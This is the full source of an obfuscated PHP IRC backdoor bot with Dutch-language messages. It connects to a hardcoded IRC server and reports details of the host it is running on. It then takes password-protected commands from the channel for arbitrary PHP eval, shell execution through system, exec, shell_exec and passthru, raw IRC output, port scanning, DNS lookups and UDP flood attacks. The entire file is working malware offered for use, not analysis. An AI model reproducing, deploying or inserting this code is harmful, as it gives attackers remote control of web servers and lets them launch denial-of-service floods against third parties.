<?php set_time_limit(0); error_reporting(0);  class bjZfznNnnFBjzNzzn {

 var $jFBvjFBvZjZnjBr = array("VZZrNJfznfjNVJjf"=>"gangbang.angels-agency.nl",
                     "VRfR"=>"23232",
                     "BNrZJ"=>"scary",
                     "BVZjVn"=>"13",
                     "dLXlx"=>"#wWw#",
                     "jFV"=>"scan",
                     "jNZrBZbrV"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "NVNjFfzJZj"=>".",
                     "FzfJBRVNjvF"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $fNVNFzbrZZbZJJJnzF = array(); 
 function uiQyaMemMEEeMqIAqAa() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $XxthXhphDtd = "\0034ON\003"; } else { $XxthXhphDtd = "\0039OFF\003"; }

	$xHDHDLtx = php_uname();
	if($xHDHDLtx == "") { $rzwOHx = "\00315---\003"; } else { $rzwOHx = "\00315".$xHDHDLtx."\003"; }
		 
	 $ZFoS = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $pdkGo =  getcwd()."";
	 
	 $lWOG = "\00315".$pdkGo."\003";

	$GWkgOOssCS = fileperms("$pdkGo");

	if (($GWkgOOssCS & 0xC000) == 0xC000) { $KoGWCKsOwOc = 's';
	} elseif (($GWkgOOssCS & 0xA000) == 0xA000) { $KoGWCKsOwOc = 'l';
	} elseif (($GWkgOOssCS & 0x8000) == 0x8000) { $KoGWCKsOwOc = '-';
	} elseif (($GWkgOOssCS & 0x6000) == 0x6000) { $KoGWCKsOwOc = 'b';
	} elseif (($GWkgOOssCS & 0x4000) == 0x4000) { $KoGWCKsOwOc = 'd';
	} elseif (($GWkgOOssCS & 0x2000) == 0x2000) { $KoGWCKsOwOc = 'c';
	} elseif (($GWkgOOssCS & 0x1000) == 0x1000) { $KoGWCKsOwOc = 'p';
	} else { $KoGWCKsOwOc = 'u'; }

	$KoGWCKsOwOc .= (($GWkgOOssCS & 0x0100) ? 'r' : '-');
	$KoGWCKsOwOc .= (($GWkgOOssCS & 0x0080) ? 'w' : '-');
	$KoGWCKsOwOc .= (($GWkgOOssCS & 0x0040) ?	(($GWkgOOssCS & 0x0800) ? 's' : 'x' ) :	(($GWkgOOssCS & 0x0800) ? 'S' : '-'));

	$KoGWCKsOwOc .= (($GWkgOOssCS & 0x0020) ? 'r' : '-');
	$KoGWCKsOwOc .= (($GWkgOOssCS & 0x0010) ? 'w' : '-');
	$KoGWCKsOwOc .= (($GWkgOOssCS & 0x0008) ?	(($GWkgOOssCS & 0x0400) ? 's' : 'x' ) :	(($GWkgOOssCS & 0x0400) ? 'S' : '-'));

	$KoGWCKsOwOc .= (($GWkgOOssCS & 0x0004) ? 'r' : '-');
	$KoGWCKsOwOc .= (($GWkgOOssCS & 0x0002) ? 'w' : '-');
	$KoGWCKsOwOc .= (($GWkgOOssCS & 0x0001) ?	(($GWkgOOssCS & 0x0200) ? 't' : 'x' ) :	(($GWkgOOssCS & 0x0200) ? 'T' : '-'));
			
	$njdh = "\00315".$KoGWCKsOwOc."\003";

	$this->iyYiIIYyyeM($this->jFBvjFBvZjZnjBr['dLXlx'],"\00314[SAFE:\003\002 $XxthXhphDtd\002\00314]\00315 $ZFoS \00314[pwd:]\00315 $lWOG \00314(\003$njdh\00314) [uname:]\00315 $rzwOHx");
 } function aYuQymy($XHh) 
 { 
    fwrite($this->OwsSgCKwc,"$XHh\r\n"); 
 } function iyYiIIYyyeM($XL,$XHh)
 {
    $this->aYuQymy("PRIVMSG $XL :$XHh");
 }function muMmaYaUEaUaqE() 
 { 
    while(!feof($this->OwsSgCKwc)) 
    { 
       $this->EAAmY = trim(fgets($this->OwsSgCKwc,512)); 
       $rfrnZVjBNFNFr = explode(" ",$this->EAAmY); 
       if(substr($this->EAAmY,0,6)=="PING :") 
       { 
          $this->aYuQymy("PONG :".substr($this->EAAmY,6)); 
       } 
       if(isset($rfrnZVjBNFNFr[1]) && $rfrnZVjBNFNFr[1] =="004") 
       { 
          $this->aYuQymy("JOIN ".$this->jFBvjFBvZjZnjBr['dLXlx']." ".$this->jFBvjFBvZjZnjBr['jFV']."");
          $this->aIMYUU($this->jFBvjFBvZjZnjBr['dLXlx'],$this->jFBvjFBvZjZnjBr['jFV']);
          $this->uiQyaMemMEEeMqIAqAa();
       } 
       if(isset($rfrnZVjBNFNFr[1]) && $rfrnZVjBNFNFr[1]=="433") 
       { 
          $this->uIYIIiQmiqqUEYAA(); 
       }
       if($this->EAAmY != $VBn_LLp) 
       { 
          $vJZvrVFZVNFVBZ = array(); 
          $Wsw = substr(strstr($this->EAAmY," :"),2); 
          $OoGK = explode(" ",$Wsw); 
          $gooCS = explode("!",$rfrnZVjBNFNFr[0]); 
          $OgcgSg = explode("@",$gooCS[1]); 
          $OgcgSg = $OgcgSg[1]; 
          $gooCS = substr($gooCS[0],1); 
          $gWCcScw = $rfrnZVjBNFNFr[0]; 
          if($OoGK[0]==$this->gooCS) 
          { 
           for($l=0;$l<count($OoGK);$l++) 
              $vJZvrVFZVNFVBZ[$l] = $OoGK[$l+1]; 
          } 
          else 
          { 
           for($l=0;$l<count($OoGK);$l++) 
              $vJZvrVFZVNFVBZ[$l] = $OoGK[$l]; 
          } 
          if(count($rfrnZVjBNFNFr)>2) 
          { 
             switch($rfrnZVjBNFNFr[1]) 
             { 
                case "QUIT": 
                   if($this->QqeyAymMqqUm($gWCcScw)) 
                   { 
                      $this->IMmqQiMq($gWCcScw); 
                   } 
                break; 
                case "PART": 
                   if($this->QqeyAymMqqUm($gWCcScw)) 
                   { 
                      $this->IMmqQiMq($gWCcScw); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->QqeyAymMqqUm($gWCcScw) && (md5($OgcgSg) == $this->jFBvjFBvZjZnjBr['FzfJBRVNjvF'] || $this->jFBvjFBvZjZnjBr['FzfJBRVNjvF'] == "*")) 
                   { 
                      if(substr($vJZvrVFZVNFVBZ[0],0,1)==$this->jFBvjFBvZjZnjBr['NVNjFfzJZj']) 
                      { 
                         switch(substr($vJZvrVFZVNFVBZ[0],1)) 
                         { 
                            case "user": 
                              if(md5($vJZvrVFZVNFVBZ[1])==$this->jFBvjFBvZjZnjBr['jNZrBZbrV']) 
                              { 
                                 $this->iUiiUQiUa($gWCcScw);
                              } 
                              else 
                              { 
                                 $this->IuiUUamuAI($this->jFBvjFBvZjZnjBr['dLXlx'],"[\002Auth\002]: Fout password $gooCS idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->QqeyAymMqqUm($gWCcScw)) 
                   { 
                      if(substr($vJZvrVFZVNFVBZ[0],0,1)==$this->jFBvjFBvZjZnjBr['NVNjFfzJZj']) 
                      { 
                         switch(substr($vJZvrVFZVNFVBZ[0],1)) 
                         {                            case "eval":
                              $eval = eval(substr(strstr($Wsw,$vJZvrVFZVNFVBZ[1]),strlen($vJZvrVFZVNFVBZ[1])));
                            break;                            case "system": 
                               $CkkGscOCwOcS = substr(strstr($Wsw,$vJZvrVFZVNFVBZ[0]),strlen($vJZvrVFZVNFVBZ[0])+1); 
                               $ocSckGkwookOK = system($CkkGscOCwOcS); 
                               $GWkOsoOgCsCGgC = explode("\n",$ocSckGkwookOK); 
                               for($l=0;$l<count($GWkOsoOgCsCGgC);$l++) 
                                  if($GWkOsoOgCsCGgC[$l]!=NULL) 
                                     $this->iyYiIIYyyeM($this->jFBvjFBvZjZnjBr['dLXlx'],"      : ".trim($GWkOsoOgCsCGgC[$l])); 
                            break;                            case "rndnick": 
                               $this->uIYIIiQmiqqUEYAA(); 
                            break;                            case "logout": 
                               $this->IMmqQiMq($gWCcScw); 
                               $this->iyYiIIYyyeM($this->jFBvjFBvZjZnjBr['dLXlx'],"[\002Auth\002]\00314 Je bent nu uitgelogt $gooCS"); 
                            break;                            case "exec": 
                               $CkkGscOCwOcS = substr(strstr($Wsw,$vJZvrVFZVNFVBZ[0]),strlen($vJZvrVFZVNFVBZ[0])+1); 
                               $ocSckGkwookOK = exec($CkkGscOCwOcS); 
                               $GWkOsoOgCsCGgC = explode("\n",$ocSckGkwookOK); 
                               for($l=0;$l<count($GWkOsoOgCsCGgC);$l++) 
                                  if($GWkOsoOgCsCGgC[$l]!=NULL) 
                                     $this->iyYiIIYyyeM($this->jFBvjFBvZjZnjBr['dLXlx'],"      : ".trim($GWkOsoOgCsCGgC[$l])); 
                            break;                            case "die": 
                               $this->aYuQymy("QUIT :die command from $gooCS");
                               fclose($this->OwsSgCKwc); 
                               exit;                            case "udpflood": 
                               if(count($vJZvrVFZVNFVBZ)>3) 
                               { 
                                  $this->maQyqaiiUEmqEQAUMu($vJZvrVFZVNFVBZ[1],$vJZvrVFZVNFVBZ[2],$vJZvrVFZVNFVBZ[3]); 
                               } 
                            break;                            case "sexec":
                               $CkkGscOCwOcS = substr(strstr($Wsw,$vJZvrVFZVNFVBZ[0]),strlen($vJZvrVFZVNFVBZ[0])+1); 
                               $ocSckGkwookOK = shell_exec($CkkGscOCwOcS); 
                               $GWkOsoOgCsCGgC = explode("\n",$ocSckGkwookOK); 
                               for($l=0;$l<count($GWkOsoOgCsCGgC);$l++) 
                                  if($GWkOsoOgCsCGgC[$l]!=NULL) 
                                     $this->iyYiIIYyyeM($this->jFBvjFBvZjZnjBr['dLXlx'],"      : ".trim($GWkOsoOgCsCGgC[$l])); 
                            break;                            case "pscan": 
                               if(count($vJZvrVFZVNFVBZ) > 2) 
                               { 
                                  if(fsockopen($vJZvrVFZVNFVBZ[1],$vJZvrVFZVNFVBZ[2],$e,$s,15)) 
                                     $this->iyYiIIYyyeM($this->jFBvjFBvZjZnjBr['dLXlx'],"[\002pscan\002]: ".$vJZvrVFZVNFVBZ[1].":".$vJZvrVFZVNFVBZ[2]." is \2open\2"); 
                                  else 
                                     $this->iyYiIIYyyeM($this->jFBvjFBvZjZnjBr['dLXlx'],"[\002pscan\002]: ".$vJZvrVFZVNFVBZ[1].":".$vJZvrVFZVNFVBZ[2]." is \2closed\2"); 
                               } 
                            break;                            case "passthru": 
                               $CkkGscOCwOcS = substr(strstr($Wsw,$vJZvrVFZVNFVBZ[0]),strlen($vJZvrVFZVNFVBZ[0])+1); 

                               $ocSckGkwookOK = passthru($CkkGscOCwOcS); 
                               $GWkOsoOgCsCGgC = explode("\n",$ocSckGkwookOK); 
                               for($l=0;$l<count($GWkOsoOgCsCGgC);$l++) 
                                  if($GWkOsoOgCsCGgC[$l]!=NULL) 
                                     $this->iyYiIIYyyeM($this->jFBvjFBvZjZnjBr['dLXlx'],"      : ".trim($GWkOsoOgCsCGgC[$l])); 
                            break;                            case "info":
                               $this->uiQyaMemMEEeMqIAqAa();
                            break;                            case "restart": 
                               $this->aYuQymy("QUIT :gerestart door $gooCS");
                               fclose($this->OwsSgCKwc); 
                               $this->AMeEyaEImEeYM(); 
                            break;                            case "raw":
                               $this->aYuQymy(strstr($Wsw,$vJZvrVFZVNFVBZ[1])); 
                            break;                            case "dns": 
                               if(isset($vJZvrVFZVNFVBZ[1])) 
                               { 
                                  $Gs = explode(".",$vJZvrVFZVNFVBZ[1]); 
                                  if(count($Gs)==4 && is_numeric($Gs[0]) && is_numeric($Gs[1]) && is_numeric($Gs[2]) && is_numeric($Gs[3])) 
                                  { 
                                     $this->iyYiIIYyyeM($this->jFBvjFBvZjZnjBr['dLXlx'],"[\002dns\002]: ".$vJZvrVFZVNFVBZ[1]." => ".gethostbyaddr($vJZvrVFZVNFVBZ[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->iyYiIIYyyeM($this->jFBvjFBvZjZnjBr['dLXlx'],"[\002dns\002]: ".$vJZvrVFZVNFVBZ[1]." => ".gethostbyname($vJZvrVFZVNFVBZ[1])); 
                                  } 
                               } 
                            break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $VBn_LLp = $this->EAAmY; 
    } 
    $this->AMeEyaEImEeYM(); 
 } function maQyqaiiUEmqEQAUMu($PxPL,$dtTHXtHDLD,$MUQM) {
	$this->iyYiIIYyyeM($this->jFBvjFBvZjZnjBr['dLXlx'],"[\002UdpFlood Gestart!\002]"); 
	$xddLxPLLT = "";
	for($l=0;$l<$dtTHXtHDLD;$l++) { $xddLxPLLT .= chr(mt_rand(1,256)); }
	$xpXtp = time();
	$l = 0;
	while(time()-$xpXtp < $MUQM) {
		$bl=fsockopen("udp://".$PxPL,mt_rand(0,6000),$e,$s,5);
      	fwrite($bl,$xddLxPLLT);
       	fclose($bl);
		$l++;
	}
	$JCl = $l * $dtTHXtHDLD;
	$JCl = $JCl / 1048576;
	$tfk = $JCl / $MUQM;
	$tfk = round($tfk);
	$JCl = round($JCl);
	$this->iyYiIIYyyeM($this->jFBvjFBvZjZnjBr['dLXlx'],"[\002UdpFlood Afgerond!\002]: $JCl MB verzonden / gemiddelde: $tfk MB/s ");
 } function uIYIIiQmiqqUEYAA() {
  $lxdDdD = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $dPtplLt = strlen($lxdDdD);
  for($l=0;$l<$this->jFBvjFBvZjZnjBr['BVZjVn'];$l++) {
	$qui .= $lxdDdD[rand(0,$dPtplLt-1)];
  }
  $this->aYuQymy("NICK ".$qui."");
 } function AMeEyaEImEeYM() 
 { 
    if(!($this->OwsSgCKwc = fsockopen($this->jFBvjFBvZjZnjBr['VZZrNJfznfjNVJjf'],$this->jFBvjFBvZjZnjBr['VRfR'],$e,$s,30))) 
    $this->AMeEyaEImEeYM(); 
    $this->ImYuAyUEqYIMyyQUe();
    if(strlen($this->jFBvjFBvZjZnjBr['BNrZJ'])>0) 
    $this->aYuQymy("PASS ".$this->jFBvjFBvZjZnjBr['BNrZJ']);
    $this->uIYIIiQmiqqUEYAA();
    $this->muMmaYaUEaUaqE();
 } function iUiiUQiUa($PxPL) 
 { 
    $this->fNVNFzbrZZbZJJJnzF[$PxPL] = true; 
 } function aIMYUU($dLXlx,$jFV=NULL) 
 { 
    $this->aYuQymy("JOIN $dLXlx $jFV"); 
 } function QqeyAymMqqUm($PxPL) 
 { 
    if(isset($this->fNVNFzbrZZbZJJJnzF[$PxPL])) 
       return 1; 
    else 
       return 0; 
 } function IuiUUamuAI($XL,$XHh)
 {
    $this->aYuQymy("NOTICE $XL :$XHh");
 } function ImYuAyUEqYIMyyQUe() {
  $lxdDdD = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $dPtplLt = strlen($lxdDdD);
  for($l=0;$l<6;$l++) {
	$qui .= $lxdDdD[rand(0,$dPtplLt-1)];
  }
  if(php_uname() == "") { $xHDHDLtx = "---"; } else { $xHDHDLtx = php_uname(); }
  $this->aYuQymy("USER ".$qui."-go 127.0.0.1 localhost :".$xHDHDLtx."");
 } function IMmqQiMq($PxPL) 
 { 
    unset($this->fNVNFzbrZZbZJJJnzF[$PxPL]); 
 }}
$CkgOKOKG = new bjZfznNnnFBjzNzzn;
$CkgOKOKG->AMeEyaEImEeYM(); ?>